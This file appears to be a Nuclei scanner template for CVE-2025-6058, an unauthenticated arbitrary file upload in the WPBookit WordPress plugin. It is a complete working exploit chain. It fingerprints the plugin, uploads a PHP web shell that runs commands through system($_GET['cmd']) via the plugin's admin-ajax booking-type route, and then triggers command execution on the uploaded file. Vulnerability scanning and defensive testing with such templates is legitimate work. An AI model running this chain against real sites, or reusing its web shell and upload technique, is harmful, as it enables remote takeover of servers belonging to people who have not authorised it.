id: CVE-2025-6058

info:
  name: WPBookit <= 1.0.4 - Unauthenticated Arbitrary File Upload
  author: pussycat0x
  severity: critical
  description: |
    The image_upload_handle() function, triggered via the add_booking_type route, lacks proper file type validation. Unauthenticated attackers can upload arbitrary files, potentially leading to remote code execution (RCE)
  tags: cve,cve2025,wordpress,intrusive,rce,htcontact,plugin,file-upload,unauth

variables:
  payload: '<?php echo "<br>"; if(isset($_GET["cmd"])){ echo "<pre>"; system($_GET["cmd"]); echo "</pre>"; } ?>'
  cmd: 'id'
  month: '{{date_time("%Y/%M")}}'

flow: http(1) && http(2) && http(3)

http:
  - raw:
      - |
        GET /wp-content/plugins/wpbookit/README.txt HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        internal: true
        words:
          - "WPBookit"

      - type: status
        internal: true
        status:
          - 200

  - raw:
      - |
        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: close
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

        ------WebKitFormBoundary7MA4YWxkTrZu0gW
        Content-Disposition: form-data; name="action"

        wpb_ajax_post
        ------WebKitFormBoundary7MA4YWxkTrZu0gW
        Content-Disposition: form-data; name="route_name"

        add_booking_type
        ------WebKitFormBoundary7MA4YWxkTrZu0gW
        Content-Disposition: form-data; name="title"

        {{randstr}}
        ------WebKitFormBoundary7MA4YWxkTrZu0gW
        Content-Disposition: form-data; name="booking_type"

        {{randstr}}
        ------WebKitFormBoundary7MA4YWxkTrZu0gW
        Content-Disposition: form-data; name="cover_image_img"; filename="{{randstr}}.php"
        Content-Type: application/octet-stream

        {{payload}}
        ------WebKitFormBoundary7MA4YWxkTrZu0gW--

    matchers:
      - type: status
        internal: true
        status:
          - 200

  - raw:
      - |
        GET /wp-content/uploads/{{month}}/{{randstr}}.php?cmd={{cmd}} HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: regex
        part: body
        regex:
          - "uid=([0-9(a-z)]+)"
